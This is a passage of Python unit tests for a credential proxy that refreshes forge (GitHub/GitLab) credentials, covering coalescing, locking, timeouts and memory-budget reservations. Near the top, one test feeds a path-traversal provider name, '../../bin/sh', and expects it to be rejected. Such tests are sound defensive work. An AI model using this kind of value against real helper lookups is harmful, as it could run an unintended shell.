        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        executor.execute_internal = lambda argv: self.fail("helper was run")
        for provider in ("../../bin/sh", "git hub", "", "GitHub", "a" * 40):
            with self.subTest(provider=provider):
                with self.assertRaises(ValueError):
                    executor.refresh_forge_credential(provider, "gke-agentic/infra")

    def test_an_absent_helper_is_a_refusal_not_a_no_op(self):
        # A strategy told its credential was made current, when it was not, is
        # a 401 later from inside a clone that reads like a missing repository.
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        executor.execute_internal = lambda argv: self.fail("helper was run")
        brokered = mock.Mock(credential=providers.BrokeredCredential("gitlab", None))
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True), \
                mock.patch.object(credential_proxy, "_provider_forge", return_value=brokered):
            with self.assertRaises(RuntimeError) as raised:
                executor.refresh_forge_credential("gitlab", "gke-agentic/infra")
        self.assertIn("gitlab", str(raised.exception))

    def test_serializes_concurrent_refreshes_and_coalesces_second_caller(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []
        started_event = threading.Event()

        def slow_execute(argv, cwd=None):
            calls.append(list(argv))
            started_event.set()
            time.sleep(0.05)
            return credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="",
                stderr="",
                duration_ms=50,
                truncated=False,
                timed_out=False,
            )

        executor.execute_internal = slow_execute
        results = []

        def worker():
            try:
                executor.refresh_forge_credential("github", "gke-agentic/infra")
                results.append("ok")
            except Exception as e:
                results.append(e)

        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            t1 = threading.Thread(target=worker)
            t2 = threading.Thread(target=worker)
            t1.start()
            started_event.wait(timeout=1.0)
            t2.start()
            t1.join(timeout=2.0)
            t2.join(timeout=2.0)

        self.assertEqual(results, ["ok", "ok"])
        # Only one helper execution occurred because the second caller coalesced.
        self.assertEqual(len(calls), 1)

    def test_serializes_concurrent_refreshes_and_fails_queued_waiter_without_rerunning(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []
        started_event = threading.Event()
        t2_queued_event = threading.Event()

        def slow_failing_execute(argv, cwd=None):
            calls.append(list(argv))
            started_event.set()
            t2_queued_event.wait(timeout=2.0)
            return credential_proxy.ExecutionResult(
                exit_code=1,
                stdout="",
                stderr="Minty unavailable",
                duration_ms=50,
                truncated=False,
                timed_out=False,
            )

        executor.execute_internal = slow_failing_execute
        results = []

        def worker():
            try:
                executor.refresh_forge_credential("github", "gke-agentic/infra")
                results.append("ok")
            except Exception as e:
                results.append(e)

        real_monotonic = credential_proxy.time.monotonic

        def monotonic_hook():
            val = real_monotonic()
            if threading.current_thread() == t2:
                t2_queued_event.set()
            return val

        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True), \
             mock.patch.object(credential_proxy.time, "monotonic", side_effect=monotonic_hook):
            t1 = threading.Thread(target=worker)
            t2 = threading.Thread(target=worker)
            t1.start()
            started_event.wait(timeout=1.0)
            t2.start()
            t1.join(timeout=2.0)
            t2.join(timeout=2.0)

        # Both callers must fail with the helper error
        self.assertEqual(len(results), 2)
        self.assertIsInstance(results[0], RuntimeError)
        self.assertIsInstance(results[1], RuntimeError)
        # Helper must only execute once: waiter queued during the failure raises without re-running
        self.assertEqual(len(calls), 1)

    def test_serializes_concurrent_refreshes_and_does_not_memoize_timeouts(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []
        started_event = threading.Event()
        t2_queued_event = threading.Event()

        def execute_with_timeout(argv, cwd=None):
            calls.append(list(argv))
            if len(calls) == 1:
                started_event.set()
                t2_queued_event.wait(timeout=2.0)
                return credential_proxy.ExecutionResult(
                    exit_code=124,
                    stdout="",
                    stderr="command timed out after 30s",
                    duration_ms=30000,
                    truncated=False,
                    timed_out=True,
                )
            return credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="gke-agentic/infra\n",
                stderr="",
                duration_ms=10,
                truncated=False,
                timed_out=False,
            )

        executor.execute_internal = execute_with_timeout
        results = []

        def worker():
            try:
                executor.refresh_forge_credential("github", "gke-agentic/infra")
                results.append("ok")
            except Exception as e:
                results.append(e)

        real_monotonic = credential_proxy.time.monotonic

        def monotonic_hook():
            val = real_monotonic()
            if threading.current_thread() == t2:
                t2_queued_event.set()
            return val

        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True), \
             mock.patch.object(credential_proxy.time, "monotonic", side_effect=monotonic_hook):
            t1 = threading.Thread(target=worker)
            t2 = threading.Thread(target=worker)
            t1.start()
            started_event.wait(timeout=1.0)
            t2.start()
            t1.join(timeout=2.0)
            t2.join(timeout=2.0)

        # Thread 1 timed out; Thread 2 queued behind it ran the helper and succeeded.
        self.assertEqual(len(results), 2)
        self.assertIsInstance(results[0], TimeoutError)
        self.assertEqual(results[1], "ok")
        # Helper ran twice: timeout was not memoized, so waiter executed its own helper
        self.assertEqual(len(calls), 2)

    def test_run_forge_helper_raises_timeout_error_when_timed_out(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        executor.execute_internal = lambda argv, cwd=None: credential_proxy.ExecutionResult(
            exit_code=124,
            stdout="",
            stderr="timed out",
            duration_ms=30000,
            truncated=False,
            timed_out=True,
        )
        helper_path = mock.MagicMock(spec=credential_proxy.Path)
        helper_path.is_file.return_value = True
        with self.assertRaises(TimeoutError) as ctx:
            executor._run_forge_helper("github", helper_path, ["repo"], "credential refresh")
        self.assertIn("credential refresh timed out", str(ctx.exception))

    def test_concurrent_refreshes_for_different_orgs_do_not_share_failure(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []
        started_event = threading.Event()
        t2_queued_event = threading.Event()

        def execute_side_effect(argv, cwd=None):
            calls.append(list(argv))
            if "org-alpha/repo-a" in argv:
                started_event.set()
                t2_queued_event.wait(timeout=2.0)
                return credential_proxy.ExecutionResult(
                    exit_code=1,
                    stdout="",
                    stderr="Minty unavailable for alpha",
                    duration_ms=50,
                    truncated=False,
                    timed_out=False,
                )
            return credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="org-beta/repo-b\n",
                stderr="",
                duration_ms=10,
                truncated=False,
                timed_out=False,
            )

        executor.execute_internal = execute_side_effect
        results = {}

        def worker(repo):
            try:
                executor.refresh_forge_credential("github", repo)
                results[repo] = "ok"
            except Exception as e:
                results[repo] = e

        real_monotonic = credential_proxy.time.monotonic

        def monotonic_hook():
            val = real_monotonic()
            if threading.current_thread() == t2:
                t2_queued_event.set()
            return val

        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True), \
             mock.patch.object(credential_proxy.time, "monotonic", side_effect=monotonic_hook):
            t1 = threading.Thread(target=worker, args=("org-alpha/repo-a",))
            t2 = threading.Thread(target=worker, args=("org-beta/repo-b",))
            t1.start()
            started_event.wait(timeout=1.0)
            t2.start()
            t1.join(timeout=2.0)
            t2.join(timeout=2.0)

        # Worker 1 failed with helper error; Worker 2 succeeded for its own org
        self.assertIsInstance(results["org-alpha/repo-a"], RuntimeError)
        self.assertEqual(results["org-beta/repo-b"], "ok")
        # Helper ran twice: once for alpha (which failed) and once for beta (which succeeded)
        self.assertEqual(len(calls), 2)

    def test_coalesces_subsequent_refresh_within_coalesce_window(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []
        executor.execute_internal = lambda argv, cwd=None: (
            calls.append(list(argv))
            or credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="",
                stderr="",
                duration_ms=5,
                truncated=False,
                timed_out=False,
            )
        )
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            executor.refresh_forge_credential("github", "gke-agentic/infra")
            # Immediate second call for the same repo (differing only in casing/spaces)
            executor.refresh_forge_credential("github", " GKE-AGENTIC/INFRA ")

        self.assertEqual(len(calls), 1)

    def test_distinct_repositories_in_same_org_coalesce_when_in_minted_scope(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []
        executor.execute_internal = lambda argv, cwd=None: (
            calls.append(list(argv))
            or credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="gke-agentic/repo-a\ngke-agentic/repo-b\n",
                stderr="",
                duration_ms=5,
                truncated=False,
                timed_out=False,
            )
        )
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            executor.refresh_forge_credential("github", "gke-agentic/repo-a")
            # When helper scoped both repos into the token, second repo coalesces
            executor.refresh_forge_credential("github", "gke-agentic/repo-b")

        self.assertEqual(len(calls), 1)

    def test_sibling_repository_not_in_minted_scope_runs_and_does_not_coalesce(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []
        executor.execute_internal = lambda argv, cwd=None: (
            calls.append(list(argv))
            or credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="gke-agentic/repo-a\n",
                stderr="",
                duration_ms=5,
                truncated=False,
                timed_out=False,
            )
        )
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            executor.refresh_forge_credential("github", "gke-agentic/repo-a")
            # Helper scoped only repo-a (e.g. expansion failed or repo-b not yet registered),
            # so repo-b does NOT coalesce and executes helper
            executor.refresh_forge_credential("github", "gke-agentic/repo-b")

        self.assertEqual(len(calls), 2)

    def test_managed_repos_expansion_growth_two_call_sequence(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []

        def grow_scope(argv, cwd=None):
            calls.append(list(argv))
            if len(calls) == 1:
                return credential_proxy.ExecutionResult(
                    exit_code=0,
                    stdout="gke-agentic/repo-a\n",
                    stderr="",
                    duration_ms=5,
                    truncated=False,
                    timed_out=False,
                )
            return credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="gke-agentic/repo-a\ngke-agentic/repo-b\n",
                stderr="",
                duration_ms=5,
                truncated=False,
                timed_out=False,
            )

        executor.execute_internal = grow_scope
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            # 1. repo-a refreshed at t=0 when token only scoped repo-a
            executor.refresh_forge_credential("github", "gke-agentic/repo-a")
            self.assertEqual(len(calls), 1)

            # 2. repo-b arrives; not in cached scope, so it runs helper
            executor.refresh_forge_credential("github", "gke-agentic/repo-b")
            self.assertEqual(len(calls), 2)

            # 3. repo-a arrives within coalesce window; now in expanded scope, coalesces
            executor.refresh_forge_credential("github", "gke-agentic/repo-a")
            self.assertEqual(len(calls), 2)

    def test_distinct_organizations_both_run_and_invalidate_coalesce(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []
        executor.execute_internal = lambda argv, cwd=None: (
            calls.append(list(argv))
            or credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="",
                stderr="",
                duration_ms=5,
                truncated=False,
                timed_out=False,
            )
        )
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            executor.refresh_forge_credential("github", "org-alpha/repo-a")
            # Different organization replaces the pod-wide slot and must run
            executor.refresh_forge_credential("github", "org-beta/repo-b")
            # Requesting org-alpha again must run because org-beta replaced the slot
            executor.refresh_forge_credential("github", "org-alpha/repo-a")

        self.assertEqual(len(calls), 3)

    def test_cold_start_does_not_coalesce_at_monotonic_zero(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []
        executor.execute_internal = lambda argv, cwd=None: (
            calls.append(list(argv))
            or credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="",
                stderr="",
                duration_ms=5,
                truncated=False,
                timed_out=False,
            )
        )
        # Simulate cold node start where time.monotonic() < 30s
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True), \
             mock.patch.object(credential_proxy.time, "monotonic", return_value=5.0):
            executor.refresh_forge_credential("github", "gke-agentic/infra")

        self.assertEqual(len(calls), 1)

    def test_failed_refresh_does_not_coalesce_next_attempt(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []

        def fail_then_succeed(argv, cwd=None):
            calls.append(list(argv))
            if len(calls) == 1:
                return credential_proxy.ExecutionResult(
                    exit_code=1,
                    stdout="",
                    stderr="transient error",
                    duration_ms=5,
                    truncated=False,
                    timed_out=False,
                )
            return credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="",
                stderr="",
                duration_ms=5,
                truncated=False,
                timed_out=False,
            )

        executor.execute_internal = fail_then_succeed
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            with self.assertRaises(RuntimeError):
                executor.refresh_forge_credential("github", "gke-agentic/infra")
            # Second attempt must run and succeed, not coalesce the failure
            executor.refresh_forge_credential("github", "gke-agentic/infra")

        self.assertEqual(len(calls), 2)

    def test_coalesce_window_expires_after_30_seconds(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []
        executor.execute_internal = lambda argv, cwd=None: (
            calls.append(list(argv))
            or credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="",
                stderr="",
                duration_ms=5,
                truncated=False,
                timed_out=False,
            )
        )
        # Call 1 at 100.0: runs helper (reads: queued_at, lock-free check, check under the lock, record)
        # Call 2 at 120.0: within 30s window (reads: queued_at, lock-free check; coalesces and returns)
        # Call 3 at 140.0: 40s after Call 1, 20s after Call 2 (reads: queued_at, lock-free check, check, record)
        # A fixed window runs the helper on Call 1 and Call 3 (len(calls) == 2).
        # A sliding window (if cache write was hoisted above the coalesce return) would record 120.0 on Call 2,
        # causing Call 3 (140.0 - 120.0 = 20s < 30s) to coalesce (len(calls) == 1).
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True), \
             mock.patch.object(credential_proxy.time, "monotonic", side_effect=[100.0, 100.0, 100.0, 100.0, 120.0, 120.0, 140.0, 140.0, 140.0, 140.0]):
            executor.refresh_forge_credential("github", "gke-agentic/infra")
            executor.refresh_forge_credential("github", "gke-agentic/infra")
            executor.refresh_forge_credential("github", "gke-agentic/infra")

        self.assertEqual(len(calls), 2)

    def test_failed_refresh_for_different_org_drops_cache_entry(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []

        def handle_call(argv, cwd=None):
            calls.append(list(argv))
            # Second call (org-beta) fails after potentially modifying token slot
            if len(calls) == 2:
                return credential_proxy.ExecutionResult(
                    exit_code=1,
                    stdout="",
                    stderr="setup-git failed",
                    duration_ms=5,
                    truncated=False,
                    timed_out=False,
                )
            return credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="",
                stderr="",
                duration_ms=5,
                truncated=False,
                timed_out=False,
            )

        executor.execute_internal = handle_call
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            # 1. First refresh for org-alpha succeeds
            executor.refresh_forge_credential("github", "org-alpha/repo-a")
            # 2. Second refresh for org-beta fails
            with self.assertRaises(RuntimeError):
                executor.refresh_forge_credential("github", "org-beta/repo-b")
            # 3. Third refresh for org-alpha must run again because the failed refresh
            # dropped the provider entry (preventing false coalesce onto replaced slot)
            executor.refresh_forge_credential("github", "org-alpha/repo-a")

        self.assertEqual(len(calls), 3)

    def test_successful_refresh_clears_failure_memo_for_earlier_queued_waiter(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []

        def handle_call(argv, cwd=None):
            calls.append(list(argv))
            if len(calls) == 1:
                return credential_proxy.ExecutionResult(
                    exit_code=1,
                    stdout="",
                    stderr="temporary helper outage",
                    duration_ms=5,
                    truncated=False,
                    timed_out=False,
                )
            return credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="gke-agentic/infra\n" if len(calls) == 2 else "gke-agentic/other\n",
                stderr="",
                duration_ms=5,
                truncated=False,
                timed_out=False,
            )

        executor.execute_internal = handle_call

        # Call 1 for gke-agentic/infra fails at 100.0 (queued_at=100.0, now=100.0, failed_at=100.0)
        # Call 2 for gke-agentic/infra succeeds at 101.0 (queued_at=101.0, now=101.0, success_at=101.0)
        #   -> clears failure memo at L4501 and records scope {gke-agentic/infra}
        # Call 3 for gke-agentic/other queued at 50.0 (before Call 1 failed), acquires lock at 102.0:
        #   -> not in scope {gke-agentic/infra}, so does not coalesce
        #   -> failure memo was cleared on Call 2 success, so Call 3 does not raise stale error
        #   -> Call 3 executes helper and succeeds (len(calls) == 3)
        # If L4501 is deleted, Call 3 finds Call 1's memo (100.0 >= 50.0) and raises RuntimeError.
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True), \
             mock.patch.object(credential_proxy.time, "monotonic", side_effect=[
                 100.0, 100.0, 100.0, 100.0,  # Call 1: queued_at, lock-free now, now, failed_at
                 101.0, 101.0, 101.0, 101.0,  # Call 2: queued_at, lock-free now, now, success_at
                 50.0, 102.0, 102.0, 102.0,   # Call 3: queued_at, lock-free now, now, success_at
             ]):
            with self.assertRaises(RuntimeError):
                executor.refresh_forge_credential("github", "gke-agentic/infra")
            executor.refresh_forge_credential("github", "gke-agentic/infra")
            executor.refresh_forge_credential("github", "gke-agentic/other")

        self.assertEqual(len(calls), 3)

    # ---- Where the child memory budget is charged (design §2.1) -------------

    def _budgeted_executor(self, admits=1):
        """A constructed executor with a budget that admits `admits` slot-taking
        requests, whose helper spawn is faked and whose repository is managed."""
        executor = CommandExecutor(
            timeout_seconds=30,
            max_output_bytes=1024,
            state_dir=str(Path(self.temp_dir.name) / "state"),
        )
        per_request = (
            credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES
            + credential_proxy.OUTPUT_COPIES_PER_COMMAND * executor.max_output_bytes
        )
        executor.memory_limit_bytes = (
            credential_proxy.BROKER_RESIDENT_RESERVE_BYTES
            + credential_proxy.CONTENT_WORKSPACE_RESERVE_BYTES
            + admits * per_request
        )
        executor.children_budget_bytes = (
            executor.memory_limit_bytes
            - credential_proxy.BROKER_RESIDENT_RESERVE_BYTES
            - credential_proxy.CONTENT_WORKSPACE_RESERVE_BYTES
        )
        self.assertEqual(admits, executor.requests_the_budget_admits())
        executor.execute_internal = lambda argv, cwd=None: credential_proxy.ExecutionResult(
            exit_code=0, stdout="", stderr="", duration_ms=5, truncated=False, timed_out=False
        )
        managed = mock.patch.object(credential_proxy, "repository_is_managed", return_value=True)
        managed.start()
        self.addCleanup(managed.stop)
        return executor

    def _hold_the_budget(self, executor):
        """Fill the budget from another thread, so this one is not covered."""
        release = threading.Event()
        held = threading.Event()

        def hold():
            with executor.request_slot():
                held.set()
                release.wait(5)

        thread = threading.Thread(target=hold)
        thread.start()
        self.addCleanup(thread.join)
        self.addCleanup(release.set)
        self.assertTrue(held.wait(5))

    def test_a_coalesced_refresh_reserves_nothing_and_never_waits(self):
        executor = self._budgeted_executor(admits=1)
        executor._refresh_cache["github"] = (time.monotonic(), frozenset({"gke-agentic/infra"}))
        self._hold_the_budget(executor)
        held = executor.reserved_bytes
        started = time.monotonic()
        executor.refresh_forge_credential("github", "gke-agentic/infra")
        self.assertLess(time.monotonic() - started, 0.5)
        self.assertEqual(held, executor.reserved_bytes)

    def test_a_refresh_that_runs_the_helper_reserves_under_the_lock(self):
        executor = self._budgeted_executor(admits=1)
        seen = []
        real_run = executor._run_forge_helper

        def record(*args, **kwargs):
            seen.append((executor.reserved_bytes, executor._refresh_lock.locked()))
            return real_run(*args, **kwargs)

        with mock.patch.object(executor, "_run_forge_helper", record):
            executor.refresh_forge_credential("github", "gke-agentic/infra")
        self.assertEqual([(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, True)], seen)
        self.assertEqual(0, executor.reserved_bytes)

    def test_a_refresh_inside_a_vcs_request_takes_no_second_reservation(self):
        executor = self._budgeted_executor(admits=1)
        with executor.request_slot():
            executor.refresh_forge_credential("github", "gke-agentic/infra")
            self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)

    def test_a_refresh_queued_for_the_budget_is_refused_at_the_bound(self):
        executor = self._budgeted_executor(admits=1)
        self._hold_the_budget(executor)
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.2):
            with self.assertRaises(credential_proxy.CommandSlotUnavailable):
                executor.refresh_forge_credential("github", "gke-agentic/infra")
        self.assertFalse(executor._refresh_lock.locked())

    def _wait_until(self, condition, deadline_seconds=5):
        deadline = time.monotonic() + deadline_seconds
        while not condition():
            if time.monotonic() > deadline:
                self.fail("condition not reached before the deadline")
            time.sleep(0.01)

    def test_the_lock_is_held_while_its_holder_waits_for_the_budget_and_a_second_refresher_waits_on_it_unreserved(self):
        executor = self._budgeted_executor(admits=1)
        entered = threading.Event()
        finish = threading.Event()
        self.addCleanup(finish.set)
        calls = []
        reserved_during_helper = []

        def blocking_helper(*args, **kwargs):
            calls.append(args)
            reserved_during_helper.append(executor.reserved_bytes)
            entered.set()
            finish.wait(5)
            return subprocess.CompletedProcess([], 0, "", "")

        release = threading.Event()
        held = threading.Event()

        def hold():
            with executor.request_slot():
                held.set()
                release.wait(5)

        holder = threading.Thread(target=hold)
        holder.start()
        self.addCleanup(holder.join)
        self.addCleanup(release.set)
        self.assertTrue(held.wait(5))
        one_reservation = executor.reserved_bytes

        with mock.patch.object(executor, "_run_forge_helper", blocking_helper), \
             mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 5):
            first_results = []
            first = self._refresh_in_thread(executor, first_results)
            self._wait_until(lambda: executor.queued_requests > 0)
            self.assertTrue(executor._refresh_lock.locked())
            second_results = []
            second = self._refresh_in_thread(executor, second_results)
            time.sleep(3 * credential_proxy.COMMAND_SLOT_POLL_SECONDS)
            # The second refresher is on the lock, not in the admission queue.
            self.assertTrue(second.is_alive())
            self.assertEqual(1, executor.queued_requests)
            self.assertEqual(one_reservation, executor.reserved_bytes)
            release.set()
            holder.join(5)
            self.assertTrue(entered.wait(5))
            self.assertTrue(second.is_alive())
            self.assertEqual(0, executor.queued_requests)
            self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)
            finish.set()
            first.join(5)
            second.join(5)
        self.assertEqual(["ok"], first_results)
        self.assertEqual(["ok"], second_results)
        self.assertEqual(1, len(calls))
        self.assertEqual([credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES], reserved_during_helper)
        self.assertEqual(0, executor.reserved_bytes)

    def _start_blocking_refresh(self, executor, results, outcome=None):
        """Start a route-path refresh whose helper blocks until the returned
        event is set; `outcome` is what the helper returns, or raises."""
        entered = threading.Event()
        finish = threading.Event()
        calls = []

        def blocking_helper(*args, **kwargs):
            calls.append(args)
            if len(calls) == 1:
                entered.set()
                finish.wait(5)
                if isinstance(outcome, Exception):
                    raise outcome
            return subprocess.CompletedProcess([], 0, "", "")

        patch = mock.patch.object(executor, "_run_forge_helper", blocking_helper)
        patch.start()
        self.addCleanup(patch.stop)
        self.addCleanup(finish.set)
        first = self._refresh_in_thread(executor, results)
        self.assertTrue(entered.wait(5))
        return first, finish, calls

    @staticmethod
    def _refresh_in_thread(executor, results, caller=None):
        def refresh():
            try:
                executor.refresh_forge_credential("github", "gke-agentic/infra", caller=caller)
                results.append("ok")
            except Exception as exc:  # surfaced by the assertions
                results.append(exc)

        thread = threading.Thread(target=refresh)
        thread.start()
        return thread

    def test_late_refreshers_wait_on_the_lock_without_reserving_and_coalesce(self):
        executor = self._budgeted_executor(admits=2)
        results = []
        first, finish, calls = self._start_blocking_refresh(executor, results)
        late_results = []
        second = self._refresh_in_thread(executor, late_results)
        third = self._refresh_in_thread(executor, late_results)
        # Both late arrivals are parked on the lock, holding no reservation.
        time.sleep(3 * credential_proxy.COMMAND_SLOT_POLL_SECONDS)
        self.assertTrue(second.is_alive() and third.is_alive())
        self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)
        finish.set()
        for thread in (first, second, third):
            thread.join(5)
            self.assertFalse(thread.is_alive())
        self.assertEqual(["ok"], results)
        self.assertEqual(["ok", "ok"], late_results)
        self.assertEqual(1, len(calls))
        self.assertEqual(0, executor.reserved_bytes)

    def test_a_waiter_whose_refresh_ended_stale_reserves_and_runs_the_helper_itself(self):
        # A timeout is not memoised, so the cache is still stale when the wait
        # ends and the waiter has a refresh of its own to run.
        executor = self._budgeted_executor(admits=2)
        results = []
        first, finish, calls = self._start_blocking_refresh(
            executor, results, outcome=TimeoutError("credential refresh timed out")
        )
        second_results = []
        second = self._refresh_in_thread(executor, second_results)
        time.sleep(2 * credential_proxy.COMMAND_SLOT_POLL_SECONDS)
        self.assertEqual(1, len(calls))
        self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)
        finish.set()
        first.join(5)
        second.join(5)
        self.assertIsInstance(results[0], TimeoutError)
        self.assertEqual(["ok"], second_results)
        self.assertEqual(2, len(calls))
        self.assertEqual(0, executor.reserved_bytes)

    def test_a_waiter_re_raises_a_failure_recorded_while_it_waited_without_reserving(self):
        executor = self._budgeted_executor(admits=2)
        results = []
        first, finish, calls = self._start_blocking_refresh(
            executor, results, outcome=RuntimeError("Minty unavailable")
        )
        second_results = []
        second = self._refresh_in_thread(executor, second_results)
        time.sleep(2 * credential_proxy.COMMAND_SLOT_POLL_SECONDS)
        reserve = mock.patch.object(executor, "reserve_child_memory", side_effect=AssertionError("reserved"))
        reserve.start()
        self.addCleanup(reserve.stop)
        finish.set()
        first.join(5)
        second.join(5)
        self.assertIsInstance(results[0], RuntimeError)
        self.assertIs(results[0], second_results[0])
        self.assertEqual(1, len(calls))

    def test_a_route_refresher_holds_no_reservation_while_a_vcs_verbs_refresh_runs(self):
        executor = self._budgeted_executor(admits=2)
        entered = threading.Event()
        finish = threading.Event()
        self.addCleanup(finish.set)
        calls = []

        def blocking_helper(*args, **kwargs):
            calls.append(args)
            entered.set()
            finish.wait(5)
            return subprocess.CompletedProcess([], 0, "", "")

        covered_results = []

        def vcs_verb():
            try:
                with executor.request_slot():
                    executor.refresh_forge_credential("github", "gke-agentic/infra")
                covered_results.append("ok")
            except Exception as exc:  # surfaced by the assertions
                covered_results.append(exc)

        with mock.patch.object(executor, "_run_forge_helper", blocking_helper):
            covered = threading.Thread(target=vcs_verb)
            covered.start()
            self.assertTrue(entered.wait(5))
            route_results = []
            route = self._refresh_in_thread(executor, route_results)
            time.sleep(3 * credential_proxy.COMMAND_SLOT_POLL_SECONDS)
            self.assertTrue(route.is_alive())
            # The vcs verb's reservation alone; the route caller is on the lock.
            self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)
            self.assertEqual(0, executor.queued_requests)
            finish.set()
            covered.join(5)
            route.join(5)
        self.assertEqual(["ok"], covered_results)
        self.assertEqual(["ok"], route_results)
        self.assertEqual(1, len(calls))
        self.assertEqual(0, executor.reserved_bytes)

    def test_a_vcs_verb_with_a_current_cache_returns_without_the_lock(self):
        executor = self._budgeted_executor(admits=1)
        executor._refresh_cache["github"] = (time.monotonic(), frozenset({"gke-agentic/infra"}))
        executor._refresh_lock.acquire()
        self.addCleanup(executor._refresh_lock.release)
        helper = mock.patch.object(executor, "_run_forge_helper", side_effect=AssertionError("ran the helper"))
        helper.start()
        self.addCleanup(helper.stop)
        results = []

        def vcs_verb():
            try:
                with executor.request_slot():
                    executor.refresh_forge_credential("github", "gke-agentic/infra")
                results.append("ok")
            except Exception as exc:  # surfaced by the assertions
                results.append(exc)

        verb = threading.Thread(target=vcs_verb, daemon=True)
        verb.start()
        verb.join(5)
        self.assertFalse(verb.is_alive())
        self.assertEqual(["ok"], results)
        self.assertEqual(0, executor._covered_refresh_waiters)

    def _convoy(self, outcome=None):
        """A route refresher parked in its budget wait with the lock held,
        then a vcs verb holding the only admission calls the refresh. Returns
        (verb results, route results, helper calls) once both have finished;
        the helper's outcome is `outcome`, returned or raised."""
        executor = self._budgeted_executor(admits=1)
        entered = threading.Event()
        finish = threading.Event()
        self.addCleanup(finish.set)
        calls = []

        def blocking_helper(*args, **kwargs):
            calls.append(threading.current_thread().name)
            entered.set()
            finish.wait(5)
            if isinstance(outcome, Exception):
                raise outcome
            return subprocess.CompletedProcess([], 0, "", "")

        held = threading.Event()
        go = threading.Event()
        self.addCleanup(go.set)
        verb_results = []

        def vcs_verb():
            try:
                with executor.request_slot():
                    held.set()
                    go.wait(5)
                    executor.refresh_forge_credential("github", "gke-agentic/infra")
                verb_results.append("ok")
            except Exception as exc:  # surfaced by the assertions
                verb_results.append(exc)

        # Long, so the route caller cannot get out of the knot by timing out.
        with mock.patch.object(executor, "_run_forge_helper", blocking_helper), \
             mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 120):
            verb = threading.Thread(target=vcs_verb, name="verb", daemon=True)
            verb.start()
            self.assertTrue(held.wait(5))
            one_reservation = executor.reserved_bytes
            route_results = []
            route = self._refresh_in_thread(executor, route_results)
            # The route caller holds the lock and waits for the budget.
            self._wait_until(lambda: executor.queued_requests > 0)
            self.assertTrue(executor._refresh_lock.locked())
            go.set()
            # The verb runs the helper under its own reservation while the
            # route caller, out of the admission queue, waits behind it.
            self.assertTrue(entered.wait(5))
            self.assertEqual(["verb"], calls)
            self.assertTrue(route.is_alive())
            self.assertEqual(0, executor.queued_requests)
            self.assertEqual(one_reservation, executor.reserved_bytes)
            self.assertEqual(0, executor._covered_refresh_waiters)
            finish.set()
            verb.join(5)
            route.join(5)
            self.assertFalse(verb.is_alive() or route.is_alive())
        self.assertEqual(1, len(calls))
        self.assertEqual(0, executor._covered_refresh_waiters)
        self.assertFalse(executor._refresh_lock.locked())
